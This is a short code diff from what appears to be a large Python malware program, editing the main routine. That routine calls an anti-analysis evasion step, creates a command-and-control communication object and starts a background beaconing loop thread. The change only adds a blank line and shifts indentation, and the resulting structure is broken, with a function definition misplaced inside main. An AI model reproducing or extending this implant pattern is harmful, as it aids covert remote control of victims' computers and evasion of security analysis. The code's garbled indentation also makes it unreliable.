@@ -4637,6 +4637,7 @@ def main():
         AntiAnalysis.evade_analysis()
         
         c2 = C2Communication()
+        
 def beacon_loop():
      while True:
          try:
@@ -4647,7 +4648,7 @@ def beacon_loop():
          except:
             time.sleep(60)
 
-        threading.Thread(target=beacon_loop, daemon=True).start()
+            threading.Thread(target=beacon_loop, daemon=True).start()
         
         try:
             while True:
